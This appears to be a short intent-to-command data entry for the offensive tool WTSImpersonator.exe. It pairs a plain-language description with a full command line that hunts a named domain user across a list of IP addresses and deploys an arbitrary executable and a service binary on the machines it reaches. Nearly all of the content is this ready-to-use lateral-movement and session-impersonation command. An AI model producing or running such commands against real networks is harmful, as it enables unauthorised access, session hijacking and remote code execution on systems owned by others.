# Natural language intent:
# "WTSImpersonator.exe" to perform a user-hunting operation, targeting a specific user in a given domain, using a list of IP addresses. Additionally, it executes two other executables, "ExeToExecute.exe" and "WTServiceBinary.exe," as part of the operation.

.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
